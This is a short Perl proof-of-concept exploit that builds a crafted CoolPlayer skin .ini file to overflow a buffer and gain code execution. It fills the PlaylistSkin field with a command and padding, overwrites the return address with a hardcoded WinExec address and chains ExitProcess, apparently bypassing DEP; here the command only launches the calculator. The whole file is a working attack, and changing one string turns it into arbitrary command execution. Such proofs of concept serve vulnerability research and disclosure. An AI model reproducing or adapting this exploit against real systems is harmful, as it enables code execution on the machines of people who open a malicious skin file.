my $file= "depSkinCalc.ini"; # File name
my $header = "[CoolPlayer Skin]\nPlaylistSkin="; # Skins header
my $shellcode = "cmd /c calc &"; # Command
my $padding = "\x41" x (484 - length($shellcode)); # padding
$eip = pack('V',0x7C8623AD); # WinExec
$stacktop = pack('V',0x7C81CAFA); # ExitProcess
$stacktop = $stacktop. pack('V',0x0012BCC0); # Command address
#$stacktop = $stacktop. pack('V',0xFFFFFFFF); # Style (null bytes above so can't use)
open($FILE,">$file");
print $FILE $header.$shellcode.$padding.$eip.$stacktop; # Save & close file
close($FILE);